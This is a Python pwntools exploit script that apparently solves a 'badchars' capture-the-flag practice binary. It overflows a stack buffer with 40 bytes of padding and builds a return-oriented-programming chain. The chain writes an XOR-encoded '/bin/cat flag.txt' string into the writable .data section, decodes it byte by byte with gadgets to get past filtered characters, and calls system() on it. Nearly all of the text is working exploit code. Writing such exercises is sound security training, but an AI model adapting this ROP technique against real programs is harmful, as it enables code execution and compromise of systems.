#!/usr/bin/python
from pwn import *
import struct

# 25 0x00001070    16 0x00601070    16 --rw- .data    

# badchars are: b i c / <space> f n s
# badchars -> \x62\x69\x63\x2f\x20\x66\x6e\x73

# 0x0000000000400b30: xor byte ptr [r15], r14b; ret; 
# 0x0000000000400b34: mov qword ptr [r13], r12; ret; 
# 0x0000000000400b39: pop rdi; ret; 
# 0x0000000000400b3b: pop r12; pop r13; ret; 
# 0x0000000000400b40: pop r14; pop r15; ret; 

# /bin/cat flag.txt
xorcommand = [ # xor 0x30
    '\x1f\x52\x59\x5e\x1f\x53at',
    '\x10\x56lag.tx',
    't\x00\x00\x00\x00\x00\x00\x00'
]
xorlist = [0,1,2,3,4,5,8,9] # Characters that need to be xor'd in our command

elf = ELF('badchars')

pad = 'A'*40
ropchain = ''
for c in xrange(3):
    ropchain += struct.pack('<Q', 0x400b3b)        # 0x0000000000400b3b: pop r12; pop r13; ret;
    ropchain += xorcommand[c]
    ropchain += struct.pack('<Q', 0x601080+(c*8))  # 25 0x00001070    16 0x00601080    16 --rw- .data
    ropchain += struct.pack('<Q', 0x400b34)        # 0x0000000000400b34: mov qword ptr [r13], r12; ret;
for x in xorlist:
    ropchain += struct.pack('<Q', 0x400b40)        # 0x0000000000400b40: pop r14; pop r15; ret;
    ropchain += struct.pack('<Q', 0x30)
    ropchain += struct.pack('<Q', 0x601080+int(x)) # 25 0x00001070    16 0x00601080    16 --rw- .data
    ropchain += struct.pack('<Q', 0x400b30)        # 0x0000000000400b30: xor byte ptr [r15], r14b; ret;
ropchain += struct.pack('<Q', 0x400b39) 	   # 0x0000000000400b39: pop rdi; ret; i
ropchain += struct.pack('<Q', 0x601080) 	   # 25 0x00001070    16 0x00601080    16 --rw- .data
ropchain += struct.pack('<Q', 0x4009e8) 	   # call   4006f0 <system@plt>
exploit = pad + ropchain

io = process(elf.path)
io.recv()
io.sendline(exploit)

flag = io.recv()
success(flag)
